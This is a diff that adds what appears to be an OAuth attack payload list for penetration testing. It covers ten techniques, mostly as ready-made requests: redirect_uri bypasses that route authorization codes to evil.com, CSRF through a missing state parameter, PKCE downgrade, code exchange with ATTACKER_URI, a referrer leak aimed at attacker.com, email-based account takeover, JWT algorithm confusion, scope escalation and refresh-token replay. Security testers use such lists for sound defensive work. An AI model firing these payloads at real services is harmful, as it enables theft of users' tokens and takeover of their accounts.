@@ -1,0 +1,63 @@
+# ---- ATTACK 1: Open Redirect in redirect_uri ----
+# If redirect_uri not strictly validated:
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://evil.com&response_type=code
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=//evil.com&response_type=code
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com.evil.com/callback&response_type=code
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback/../../../evil.com&response_type=code
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://evil.com%23.target.com/callback&response_type=code
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback%20https://evil.com&response_type=code
+ 
+# Wildcard bypass:
+# If allowed: https://target.com/*
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com@evil.com&response_type=code
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback?x=https://evil.com&response_type=code
+ 
+# ---- ATTACK 2: State Parameter CSRF Bypass ----
+# Missing state → CSRF on authorization flow
+# Reuse state → state fixation
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&response_type=code&state=
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&response_type=code
+# (no state parameter at all)
+ 
+# ---- ATTACK 3: response_type=token (Implicit Flow) ----
+# Token in URL fragment = history leak, referrer leak
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&response_type=token
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&response_type=id_token
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&response_type=token%20id_token
+ 
+# ---- ATTACK 4: PKCE Downgrade ----
+# If PKCE optional, remove code_challenge:
+# Normal: ?code_challenge=X&code_challenge_method=S256
+# Attack: Remove code_challenge entirely
+https://target.com/oauth/authorize?client_id=APP&redirect_uri=CALLBACK&response_type=code
+# (no code_challenge)
+ 
+# ---- ATTACK 5: Code to Token Exchange without Secret ----
+POST /oauth/token
+grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=ATTACKER_URI&client_id=APP
+ 
+# ---- ATTACK 6: Token Leakage via Referrer ----
+# If implicit flow: token in URL fragment
+# Navigate from target to attacker's page → Referrer header leaks fragment in some browsers
+# Test: embed <img src="https://attacker.com"> after OAuth redirect
+ 
+# ---- ATTACK 7: Account Takeover via Email ----
+# If OAuth links account by email (not verified):
+# 1. Register attacker@evil.com on IdP
+# 2. OAuth flow creates account linked to existing email on target
+# Test: sign in with Google using victim's email if target doesn't verify
+ 
+# ---- ATTACK 8: JWT kid / jku in id_token ----
+# See jwt/jwt.txt for full details
+# id_token RS256 → HS256 confusion using public key as HMAC secret
+ 
+# ---- ATTACK 9: Scope Manipulation ----
+https://target.com/oauth/authorize?client_id=APP&scope=admin
+https://target.com/oauth/authorize?client_id=APP&scope=openid+profile+email+admin
+https://target.com/oauth/authorize?client_id=APP&scope=*
+https://target.com/oauth/authorize?client_id=APP&scope=read:admin+write:admin
+ 
+# ---- ATTACK 10: Token Reuse / Replay ----
+# Refresh token after logout — server may not revoke
+POST /oauth/token
+grant_type=refresh_token&refresh_token=OLD_REFRESH_TOKEN
